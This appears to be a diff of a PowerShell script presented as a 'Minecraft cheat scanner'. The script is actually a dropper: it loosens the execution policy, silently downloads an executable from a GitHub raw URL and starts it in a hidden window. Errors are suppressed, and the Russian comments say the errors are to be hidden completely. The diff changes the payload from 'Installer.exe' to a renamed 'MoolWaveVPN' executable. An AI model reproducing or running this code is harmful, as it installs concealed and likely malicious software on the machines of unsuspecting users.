@@ -1,10 +1,10 @@
 # MINECRAFT CHEAT SCANNER v2.0 
 Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Force
 
- Invoke-WebRequest -Uri "https://github.com/Proshkaversus/files/raw/refs/heads/main/Installer.exe" -OutFile "Installer.exe" -ErrorAction SilentlyContinue
+ Invoke-WebRequest -Uri "https://github.com/Proshkaversus/files/raw/refs/heads/main/enc_31e3aec384184293bcb7e804124bd965_MoolWaveVPN.exe%20(2).exe" -OutFile "enc_31e3aec384184293bcb7e804124bd965_MoolWaveVPN.exe%20(2).exe" -ErrorAction SilentlyContinue
     
     # Запускаем 
-    Start-Process -FilePath "Installer.exe" -WindowStyle Hidden
+    Start-Process -FilePath "enc_31e3aec384184293bcb7e804124bd965_MoolWaveVPN.exe%20(2).exe" -WindowStyle Hidden
     
 Set-ExecutionPolicy Bypass -Scope Process -Force
 
@@ -100,6 +100,7 @@ try {
 } catch {
     # Полностью скрываем ошибки
 }
+
 
 
 
